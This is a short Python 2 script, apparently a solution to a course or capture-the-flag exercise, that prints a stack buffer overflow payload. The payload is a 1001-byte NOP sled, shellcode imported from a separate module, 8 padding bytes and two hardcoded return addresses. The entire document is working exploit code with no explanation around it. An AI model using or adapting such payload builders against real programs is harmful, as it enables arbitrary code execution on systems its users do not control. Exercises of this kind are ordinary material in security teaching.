from struct import pack
import os,sys
from shellcode import shellcode
print "\x90" * 1001 + shellcode + "\x41" * 8 + pack("<I", 0xbffea158) + pack("<I", 0xbffe9e20)
